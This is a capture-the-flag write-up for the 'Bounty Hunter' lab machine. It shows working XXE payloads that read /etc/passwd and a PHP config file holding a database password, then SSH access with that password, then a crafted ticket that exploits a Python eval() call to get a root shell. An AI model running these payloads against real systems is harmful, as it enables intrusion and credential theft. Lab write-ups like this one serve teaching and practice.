Bounty Hunter - 10.10.11.100 

Port scan 
PORT   STATE SERVICE REASON  VERSION
    22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))
    |_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
    | http-methods: 
    |_  Supported Methods: GET HEAD POST OPTIONS
    |_http-server-header: Apache/2.4.41 (Ubuntu)
    |_http-title: Bounty Hunters
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service search returns nothing of interest... seems like it'll be a website misconfig

Directory Browsing

    .php                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 13ms]
index.php               [Status: 200, Size: 25169, Words: 10028, Lines: 389, Duration: 13ms]
resources               [Status: 301, Size: 316, Words: 20, Lines: 10, Duration: 10ms]
assets                  [Status: 301, Size: 313, Words: 20, Lines: 10, Duration: 12ms]
portal.php              [Status: 200, Size: 125, Words: 11, Lines: 6, Duration: 12ms]
                        [Status: 200, Size: 25169, Words: 10028, Lines: 389, Duration: 1262ms]
css                     [Status: 301, Size: 310, Words: 20, Lines: 10, Duration: 11ms]
db.php                  [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 12ms]
js                      [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 11ms]
.php                    [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 12ms]
                        [Status: 200, Size: 25169, Words: 10028, Lines: 389, Duration: 12ms]
server-status           [Status: 403, Size: 277, Words: 20, Lines: 10, Duration: 12ms]


    http://10.10.11.100/resources has a text file
    10.10.11.100/resources/README.txt
        [ ] Disable 'test' account on portal and switch to hashed password. Disable nopass.
        [X] Write tracker submit script
        [ ] Connect tracker submit script to the database
        [X] Fix developer group permissions

ZAProxy
   ZAP found the file http://10.10.11.100/tracker_diRbPr00f314.php reported that it was suceptible to SQLi 
    --> Upon further inspection, this is actually an XXE vuln
    --> http://10.10.11.100/log_submit.php sends data to the above link.
            First, the data is base64 encoded --> URL encoded
                <?xml  version="1.0" encoding="ISO-8859-1"?>
                <!DOCTYPE data [
                <!ENTITY file SYSTEM "file:///etc/passwd">
                ]>
                <bugreport>
                    <title>title</title>
                    <cwe>cwe</cwe>
                    <cvss>cvss scoring</cvss>
                    <reward>&file;</reward>
                </bugreport>


This leads to the user accounts root & development

XXE is then used to extract the db.php file previously found in the ffuf scan
php filter is used due to .php file funkyness


        <?xml  version="1.0" encoding="ISO-8859-1"?>
        <!DOCTYPE data [
        <!ENTITY file SYSTEM "php://filter/convert.base64-encode/resource=/var/www/html/db.php">
        ]>
        		<bugreport>
        		<title>title</title>
        		<cwe>cwe</cwe>
        		<cvss>cvss scoring</cvss>
        		<reward>&file;</reward>
        		</bugreport>
    
The php file is returned w/ this

    <?php
    // TODO -> Implement login system with the database.
    $dbserver = "localhost";
    $dbname = "bounty";
    $dbusername = "admin";
    $dbpassword = "m19RoAU0hP41A1sTsq6K";
    $testuser = "test";
    ?>

Use development:m19RoAU0hP41A1sTsq6K to ssh into the machine

User.txt
6c28d02a0dc78533dc7b398068f5e712

Privilege Escalation:

sudo -l
    User development may run the following commands on bountyhunter:
    (root) NOPASSWD: /usr/bin/python3.8 /opt/skytrain_inc/ticketValidator.py

    development@bountyhunter:/opt/skytrain_inc$ cat ticketValidator.py 
        #Skytrain Inc Ticket Validation System 0.1
        #Do not distribute this file.
        
        def load_file(loc):
            if loc.endswith(".md"):
                return open(loc, 'r')
#only opens files that end with .md
            else:
                print("Wrong file type.")
                exit()
        
        def evaluate(ticketFile):
            #Evaluates a ticket to check for ireggularities.
            code_line = None
            for i,x in enumerate(ticketFile.readlines()):
#Gets file line numbers & file lines
                if i == 0:
                    if not x.startswith("# Skytrain Inc"):
                        return False
                    continue
#Checks for ticket header
                if i == 1:
                    if not x.startswith("## Ticket to "):
                        return False
                    print(f"Destination: {' '.join(x.strip().split(' ')[3:])}")
                    continue
        
                if x.startswith("__Ticket Code:__"):
                    code_line = i+1
                    continue
        
                if code_line and i == code_line:
                    if not x.startswith("**"):
                        return False
                    ticketCode = x.replace("**", "").split("+")[0]
                    if int(ticketCode) % 7 == 4:
##First number needs to modulo to 4, then the eval will trigger. This will replace ** w/ nothing and then eval the remaining lines. Insert malicious code after this
###NEXT LINE IS THE VULN
                        validationNumber = eval(x.replace("**", ""))
                        if validationNumber > 100:
                            return True
                        else:
                            return False
            return False
        
        def main():
            fileName = input("Please enter the path to the ticket file.\n")
            ticket = load_file(fileName)
            #DEBUG print(ticket)
            result = evaluate(ticket)
            if (result):
                print("Valid ticket.")
            else:
                print("Invalid ticket.")
            ticket.close
        
        main()

The malicious ticket:

    # Skytrain Inc
    ## Ticket to New Haven
    __Ticket Code:__
    **11 + 0 and __import__('os').system('/bin/bash')

The first three lines pass the check then the last line will get executed as long as first number modulo 7 = 4 and it has a reason to continue to the next set of code

root.txt
57bc78dfd613255dfa4cc1ec912cfda8
